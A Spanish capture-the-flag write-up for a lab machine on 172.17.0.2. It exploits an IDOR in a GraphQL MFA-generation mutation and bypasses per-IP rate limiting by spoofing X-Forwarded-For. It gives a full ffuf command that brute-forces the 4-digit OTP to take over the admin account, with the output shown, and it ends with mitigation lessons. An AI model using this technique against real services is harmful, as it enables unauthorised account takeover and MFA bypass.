---
tags:
  - CTF
  - writeup
  - bunkerlabs
  - web
  - graphql
  - idor
  - mfa-bypass
  - rate-limit-bypass
dificultad: "⭐⭐ Fácil"
sistema: "Web — Werkzeug / Python Flask"
ip: "172.17.0.2"
técnicas:
  - IDOR en GraphQL
  - Account Takeover
  - Bypass de Rate Limit con X-Forwarded-For
  - Fuerza bruta de OTP con ffuf
fecha: 2026-06-15
estado: "✅ Completada"
---

# 🖥️ Máquina: BreakMFA (BunkerLabs)

## Información general

- **Plataforma:** BunkerLabs
- **Dificultad:** Fácil
- **Stack:** Werkzeug / Python 3.12 / GraphQL
- **IP objetivo:** `172.17.0.2`
- **Técnicas:** IDOR en GraphQL · Account Takeover · Bypass de Rate Limit · Fuerza bruta OTP

---

## 🗺️ Flujo del ataque

```
Ping → Nmap (5000/http) → Login como user → MFA → Burp: GraphQL Generate2FA
→ IDOR (email: admin) → Código enviado a admin → POST /mfa con email admin
→ Rate limit (429) → Bypass X-Forwarded-For → ffuf OTP brute force → Dashboard → Flag
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.055 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.058 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.059 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.034 ms
4 packets transmitted, 4 received, 0% packet loss
```

**TTL = 64 → Sistema Linux confirmado**

---

### Escaneo de puertos con Nmap

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

**Resultado:**

| Puerto   | Estado | Servicio | Versión                          |
|----------|--------|----------|----------------------------------|
| 5000/tcp | open   | HTTP     | Werkzeug 3.1.5 (Python 3.12.12)  |

**Nota:** Werkzeug es el servidor de desarrollo de Flask. El Nmap ya indica que la raíz redirige a `/login`.

---

## 2️⃣ Análisis de la aplicación

La página en `http://172.17.0.2:5000` muestra un formulario de login con el objetivo del reto claramente expuesto:

*"Objetivo: Consigue acceso a la cuenta admin@admin.es. Primero inicia sesión como user@user.es y analiza cómo explotar el Account Takeover en el flujo de MFA."*

Las credenciales de demo son: **`user@user.es / password123`**

Tras autenticarse, la aplicación solicita un código MFA de 4 dígitos enviado al dispositivo del usuario.

---

## 3️⃣ Descubrimiento del vector — IDOR en GraphQL

Con Burp Suite interceptando el tráfico, se observa que al llegar a la pantalla de MFA, la aplicación hace una llamada a `/graphql`:

```json
POST /graphql HTTP/1.1

{
  "operationName": "Generate2FA",
  "query": "mutation Generate2FA($email: String!) { generate2FA(email: $email) { recoveryCodes } }",
  "variables": {
    "email": "user@user.es"
  }
}
```

**Crítico:** La mutación `generate2FA` acepta cualquier email como parámetro sin verificar que el email pertenezca al usuario autenticado. Esto es un **IDOR** (Insecure Direct Object Reference): cualquier usuario puede solicitar la generación de un código MFA para cualquier otra cuenta.

---

## 4️⃣ Explotación — Account Takeover vía IDOR

Se modifica el campo `email` de la petición GraphQL, cambiando `user@user.es` por `admin@admin.es`, y se reenvía:

```json
{
  "operationName": "Generate2FA",
  "query": "mutation Generate2FA($email: String!) { generate2FA(email: $email) { recoveryCodes } }",
  "variables": {
    "email": "admin@admin.es"
  }
}
```

**Respuesta del servidor:**

```json
HTTP/1.1 200 OK

{
  "data": {
    "generate2FA": {
      "message": "Códigos MFA generados para el correo proporcionado"
    }
  }
}
```

**El servidor generó un código MFA para `admin@admin.es` sin error.** Ahora hay que enviarlo al endpoint `/mfa` usando el email de admin para completar el takeover.

### Confirmación del cambio de sesión

Enviando un código incorrecto al endpoint `/mfa` con el email de admin:

```
email=admin%40admin.es&code=1234
```

La respuesta HTML devuelve:

```html
<div class="error">Código incorrecto para admin@admin.es</div>
```

**El servidor ya está procesando la autenticación del código en el contexto de `admin@admin.es`.** El Account Takeover está en curso — solo falta encontrar el código correcto.

---

## 5️⃣ Bypass de Rate Limit + Fuerza bruta del OTP

Al intentar varios códigos seguidos, el servidor bloquea las peticiones:

```
HTTP/1.1 429 TOO MANY REQUESTS
```

**Advertencia:** La aplicación implementa Rate Limiting por IP para evitar fuerza bruta sobre el OTP. Para bypasear esto se usa el header **`X-Forwarded-For`**, que muchas aplicaciones leen para identificar la IP del cliente. Rotando el último octeto de esa IP en cada petición, el servidor cree que cada request viene de una IP diferente.

### Comando ffuf

```bash
ffuf -u "http://172.17.0.2:5000/mfa" \
  -X POST \
  -d "email=admin%40admin.es&code=FUZZ" \
  -H "X-Forwarded-for: 21.21.21.FUZZ2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=eyJtZmFfdmVyaWZpZWQiOnRydWUsInVzZXIiOiJ1c2VyQHVzZXIuZXMifQ.ajCVtg.0UpRQ4WAsw9SLKwj_H0f2lZuEbA" \
  -w <(seq -f "%04g" 0 9999):FUZZ \
  -w <(for i in {0..9999}; do echo $((i % 256)); done):FUZZ2 \
  -mode pitchfork \
  -fr "Código incorrecto"
```

**Explicación del comando:**

| Parámetro | Función |
|-----------|----------|
| `-d "email=admin%40admin.es&code=FUZZ"` | Envía la petición POST con el email de admin y el código como wordlist |
| `-H "X-Forwarded-for: 21.21.21.FUZZ2"` | Rota el último octeto de la IP para bypassear el rate limit por IP |
| `-w <(seq -f "%04g" 0 9999):FUZZ` | Genera todos los códigos OTP posibles del `0000` al `9999` |
| `-w <(for i in {0..9999}; do echo $((i % 256)); done):FUZZ2` | Genera valores del 0 al 255 de forma cíclica para el último octeto del header |
| `-mode pitchfork` | Itera ambas wordlists en paralelo (posición a posición), no en producto cartesiano |
| `-fr "Código incorrecto"` | Filtra las respuestas que contengan ese texto, mostrando solo los hits válidos |

**Nota:** El modo `pitchfork` es clave aquí: hace que `FUZZ` (el código OTP) y `FUZZ2` (el octeto IP) avancen juntos en cada petición, asegurando que cada código se intente con una IP diferente. Si se usara el modo `clusterbomb`, generaría 10000×256 combinaciones, lo cual es innecesario.

**Resultado:**

```
[Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 45ms]
    * FUZZ: 4027
    * FUZZ2: 187

[Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 43ms]
    * FUZZ: 5619
    * FUZZ2: 243
```

---

## 6️⃣ Acceso al dashboard

Usando cualquiera de los códigos encontrados (`4027` o `5619`), el servidor responde con un `302 Found` redirigiendo al `/dashboard`:

```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJtZmFfdmVyaWZpZWQiOnRydWUsInVzZXIiOiJhZG1pbkBhZG1pbi5lcyJ9...
```

Se abre la respuesta en el navegador desde Burp Suite (clic derecho → *Show response in browser*) y se navega al dashboard.

**Acceso al panel de administrador como `admin@admin.es`** — Account Takeover completado.

```
Flag: JKLNDGS9DS7FYG9DS7G
```

---

## ✅ Resumen de vulnerabilidades

| Vulnerabilidad | Detalle |
|----------------|----------|
| IDOR en GraphQL | `generate2FA` no valida que el email pertenezca al usuario autenticado |
| Rate Limit bypasseable | El límite se aplica por IP y puede evadirse con `X-Forwarded-For` |
| OTP de 4 dígitos | Solo 10.000 combinaciones posibles, trivialmente fuerza-bruteable |

---

## 🔍 Lecciones aprendidas

**Malas prácticas identificadas:**

- **IDOR en la mutación GraphQL** — la generación del MFA debe validar server-side que el email coincide con el usuario de la sesión activa.
- **Rate limit basado en IP del cliente** — la IP no es un identificador confiable si el servidor acepta headers como `X-Forwarded-For` sin validación.
- **OTP de solo 4 dígitos** — un espacio de 10.000 valores es demasiado pequeño; se recomienda al menos 6 dígitos con bloqueo temporal tras intentos fallidos.

---

## 📚 Referencias

- [OWASP — IDOR](https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf)
- [OWASP — Testing for Rate Limiting](https://owasp.org/www-project-web-security-testing-guide/)
- [GraphQL Security — IDOR / Authorization](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [ffuf — Documentation](https://github.com/ffuf/ffuf)
- [Burp Suite](https://portswigger.net/burp)
